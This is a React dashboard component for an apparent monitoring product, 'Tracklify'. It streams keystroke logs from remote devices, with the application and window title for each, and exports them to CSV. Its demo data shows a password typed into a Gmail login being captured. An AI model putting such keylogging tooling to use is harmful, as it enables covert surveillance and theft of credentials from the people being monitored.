"use client"

import { useState, useEffect } from "react"
import { Download, Search, RefreshCw, Activity } from "lucide-react"
import { format } from "date-fns"
import { useDebounce } from "@/hooks/use-debounce"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardFooter } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { LiveIndicator } from "@/components/ui/live-indicator"
import {
  Select,
  SelectContent,
  SelectGroup,
  SelectItem,
  SelectLabel,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import { Skeleton } from "@/components/ui/skeleton"
import { Badge } from "@/components/ui/badge"
import { createClient } from "@/lib/supabase/client"
import { useAuth } from "@/context/SupabaseProvider"
import { toast } from "sonner"

interface AgentLog {
  id: string
  device_id: string
  keystroke: string
  window_title?: string
  application?: string
  created_at: string
  metadata?: any
}

export function LiveLogs() {
  const [logs, setLogs] = useState<AgentLog[]>([])
  const [searchTerm, setSearchTerm] = useState("")
  const [deviceId, setDeviceId] = useState<string>("all")
  const [isLoading, setIsLoading] = useState(true)
  const [isRealTimeConnected, setIsRealTimeConnected] = useState(false)
  const [newLogIds, setNewLogIds] = useState<Set<string>>(new Set())
  const debouncedSearchTerm = useDebounce(searchTerm, 500)

  const { user } = useAuth()
  const supabase = createClient()

  useEffect(() => {
    if (user) {
      fetchInitialLogs()
      setupRealtimeSubscription()
    }
  }, [user])

  useEffect(() => {
    if (debouncedSearchTerm || deviceId !== "all") {
      filterLogs()
    }
  }, [debouncedSearchTerm, deviceId])

  const fetchInitialLogs = async () => {
    try {
      setIsLoading(true)

      // Try to fetch real logs first
      const { data: realLogs, error } = await supabase
        .from("agent_logs")
        .select("*")
        .order("created_at", { ascending: false })
        .limit(50)

      if (error && error.code === "42P01") {
        // Table doesn't exist, use mock data
        console.log("agent_logs table not found, using mock data")
        const mockLogs = generateMockLogs()
        setLogs(mockLogs)
        toast.info("Using demo data - agent_logs table not found")
      } else if (error) {
        console.error("Error fetching logs:", error)
        toast.error("Failed to load logs")
        setLogs([])
      } else {
        setLogs(realLogs || [])
        if (realLogs && realLogs.length === 0) {
          toast.info("No logs found - install and run the agent to see activity")
        }
      }
    } catch (error) {
      console.error("Error fetching logs:", error)
      // Fallback to mock data
      const mockLogs = generateMockLogs()
      setLogs(mockLogs)
      toast.info("Using demo data")
    } finally {
      setIsLoading(false)
    }
  }

  const setupRealtimeSubscription = () => {
    const channel = supabase
      .channel("realtime:agent_logs")
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "agent_logs",
        },
        (payload) => {
          console.log("New log received:", payload.new)
          const newLog = payload.new as AgentLog

          setLogs((prevLogs) => [newLog, ...prevLogs.slice(0, 99)]) // Keep only latest 100
          setNewLogIds((prev) => new Set(prev).add(newLog.id))

          // Remove highlight after animation
          setTimeout(() => {
            setNewLogIds((prev) => {
              const updated = new Set(prev)
              updated.delete(newLog.id)
              return updated
            })
          }, 2000)

          toast.success("New activity detected")
        },
      )
      .subscribe((status) => {
        console.log("Realtime subscription status:", status)
        setIsRealTimeConnected(status === "SUBSCRIBED")

        if (status === "SUBSCRIBED") {
          toast.success("Real-time monitoring active")
        } else if (status === "CHANNEL_ERROR") {
          toast.error("Real-time connection failed")
        }
      })

    return () => {
      supabase.removeChannel(channel)
    }
  }

  const generateMockLogs = (): AgentLog[] => {
    const mockData = [
      { keystroke: "Hello World", app: "Notepad", window: "Untitled - Notepad" },
      { keystroke: "password123", app: "Chrome", window: "Login - Gmail" },
      { keystroke: "npm install", app: "Terminal", window: "Command Prompt" },
      { keystroke: "SELECT * FROM users", app: "SSMS", window: "SQL Server Management Studio" },
      { keystroke: "[Ctrl+C]", app: "Excel", window: "Budget.xlsx - Excel" },
    ]

    return mockData.map((item, index) => ({
      id: `mock-${index}`,
      device_id: `DEMO-PC-${Math.floor(Math.random() * 100)}`,
      keystroke: item.keystroke,
      window_title: item.window,
      application: item.app,
      created_at: new Date(Date.now() - index * 60000).toISOString(),
      metadata: { demo: true },
    }))
  }

  const filterLogs = () => {
    // This would normally filter the logs based on search term and device
    // For now, we'll just refetch
    fetchInitialLogs()
  }

  const handleExportLogs = () => {
    try {
      const headers = ["ID", "Timestamp", "Device ID", "Keystroke", "Application", "Window"]
      const csvContent =
        headers.join(",") +
        "\n" +
        logs
          .map((log) => {
            return [
              log.id,
              log.created_at,
              log.device_id,
              `"${log.keystroke.replace(/"/g, '""')}"`,
              log.application || "",
              log.window_title || "",
            ].join(",")
          })
          .join("\n")

      const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" })
      const url = URL.createObjectURL(blob)
      const link = document.createElement("a")
      link.setAttribute("href", url)
      link.setAttribute("download", `tracklify-logs-${format(new Date(), "yyyy-MM-dd-HH-mm")}.csv`)
      document.body.appendChild(link)
      link.click()
      document.body.removeChild(link)

      toast.success("Logs exported successfully")
    } catch (error) {
      console.error("Error exporting logs:", error)
      toast.error("Failed to export logs")
    }
  }

  const refresh = () => {
    fetchInitialLogs()
  }

  return (
    <div className="space-y-4">
      {/* Header with controls */}
      <div className="flex flex-col sm:flex-row gap-4 items-start sm:items-center justify-between">
        <div className="flex items-center gap-2">
          <Activity className="h-5 w-5 text-primary" />
          <h3 className="text-lg font-semibold">Live Activity Monitor</h3>
          <LiveIndicator isLive={isRealTimeConnected} />
        </div>
        <div className="flex gap-2">
          <Button variant="outline" size="sm" onClick={handleExportLogs} disabled={logs.length === 0}>
            <Download className="mr-2 h-4 w-4" />
            Export
          </Button>
          <Button variant="outline" size="sm" onClick={refresh} disabled={isLoading}>
            <RefreshCw className="mr-2 h-4 w-4" />
            Refresh
          </Button>
        </div>
      </div>

      {/* Filters */}
      <div className="flex flex-col sm:flex-row gap-2">
        <div className="relative flex-1">
          <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
          <Input
            placeholder="Search logs..."
            className="pl-8"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
        </div>
        <Select value={deviceId} onValueChange={setDeviceId}>
          <SelectTrigger className="w-full sm:w-[180px]">
            <SelectValue placeholder="All devices" />
          </SelectTrigger>
          <SelectContent>
            <SelectGroup>
              <SelectLabel>Devices</SelectLabel>
              <SelectItem value="all">All devices</SelectItem>
              <SelectItem value="DEMO-PC-1">DEMO-PC-1</SelectItem>
              <SelectItem value="DEMO-PC-2">DEMO-PC-2</SelectItem>
            </SelectGroup>
          </SelectContent>
        </Select>
      </div>

      {/* Logs display */}
      <Card>
        <CardContent className="p-0">
          <div className="max-h-[600px] overflow-y-auto">
            {isLoading ? (
              <div className="space-y-2 p-4">
                {Array.from({ length: 5 }).map((_, i) => (
                  <div key={i} className="space-y-2 p-3 border-b">
                    <div className="flex items-center justify-between">
                      <Skeleton className="h-4 w-32" />
                      <Skeleton className="h-3 w-20" />
                    </div>
                    <Skeleton className="h-4 w-full" />
                    <Skeleton className="h-3 w-1/2" />
                  </div>
                ))}
              </div>
            ) : logs.length === 0 ? (
              <div className="flex flex-col items-center justify-center py-12 text-center">
                <Activity className="h-12 w-12 text-muted-foreground mb-4" />
                <h3 className="text-lg font-semibold mb-2">No activity detected</h3>
                <p className="text-muted-foreground mb-4 max-w-md">
                  {searchTerm || deviceId !== "all"
                    ? "Try adjusting your search or filter"
                    : "Install and run the Tracklify agent to start monitoring device activity"}
                </p>
                <Button variant="outline" onClick={refresh}>
                  <RefreshCw className="mr-2 h-4 w-4" />
                  Check Again
                </Button>
              </div>
            ) : (
              <div className="divide-y">
                {logs.map((log) => (
                  <div
                    key={log.id}
                    className={`p-4 transition-all duration-500 ${
                      newLogIds.has(log.id)
                        ? "bg-primary/5 border-l-4 border-l-primary animate-pulse"
                        : "hover:bg-muted/50"
                    }`}
                  >
                    <div className="flex items-start justify-between gap-4">
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 mb-1">
                          <Badge variant="outline" className="text-xs">
                            {log.device_id}
                          </Badge>
                          <span className="text-xs text-muted-foreground">
                            {format(new Date(log.created_at), "HH:mm:ss")}
                          </span>
                          {log.metadata?.demo && (
                            <Badge variant="secondary" className="text-xs">
                              Demo
                            </Badge>
                          )}
                        </div>
                        <div className="font-mono text-sm bg-muted/30 rounded px-2 py-1 mb-2">{log.keystroke}</div>
                        {(log.application || log.window_title) && (
                          <div className="text-xs text-muted-foreground">
                            {log.application && <span className="mr-2">App: {log.application}</span>}
                            {log.window_title && <span>Window: {log.window_title}</span>}
                          </div>
                        )}
                      </div>
                      <div className="text-xs text-muted-foreground">{format(new Date(log.created_at), "MMM dd")}</div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </CardContent>
        <CardFooter className="flex justify-between items-center py-3">
          <div className="text-sm text-muted-foreground">
            {logs.length} {logs.length === 1 ? "log" : "logs"} found
          </div>
          <div className="flex items-center gap-2">
            {isRealTimeConnected ? (
              <Badge className="bg-green-500 hover:bg-green-600">
                <Activity className="h-3 w-3 mr-1" />
                Live
              </Badge>
            ) : (
              <Badge variant="secondary">Offline</Badge>
            )}
          </div>
        </CardFooter>
      </Card>
    </div>
  )
}
